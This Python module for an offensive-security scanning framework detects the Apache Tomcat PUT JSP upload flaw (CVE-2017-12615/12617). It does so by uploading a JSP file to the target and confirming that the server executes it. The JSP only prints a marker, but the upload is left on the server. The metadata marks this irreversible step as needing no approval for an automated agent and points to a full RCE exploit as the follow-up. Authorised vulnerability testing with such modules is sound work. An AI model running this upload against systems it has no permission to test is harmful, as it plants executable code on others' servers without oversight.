#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Tomcat HTTP PUT JSP upload RCE (CVE-2017-12615 / CVE-2017-12617)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Tomcat - PUT JSP Upload Detection (CVE-2017-12615/12617)',
        'description': (
            'Detects CVE-2017-12615/12617 by PUT-uploading a JSP via trailing-slash path '
            'and verifying execution on GET.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'tomcat', 'rce', 'upload', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/multi/http/tomcat_cve_2017_12617_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-12615',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-12617',
        ],
        'cve': 'CVE-2017-12617',
    }

    def run(self):
        marker = 'Reproducing CVE-2017-12617'
        name = self.random_text(10).lower() + '.jsp'
        put_path = f'/{name}/'
        get_path = f'/{name}'
        body = f'<% out.println("{marker}");%>'
        r = self.http_request(
            method='PUT', path=put_path, data=body, allow_redirects=False,
        )
        if not r or r.status_code not in (201, 204):
            return False
        g = self.http_request(method='GET', path=get_path, allow_redirects=False)
        if g and marker in (g.text or ''):
            self.set_info(
                severity='critical',
                reason='Tomcat PUT JSP upload (CVE-2017-12615/12617)',
                path=get_path,
            )
            return True
        return False
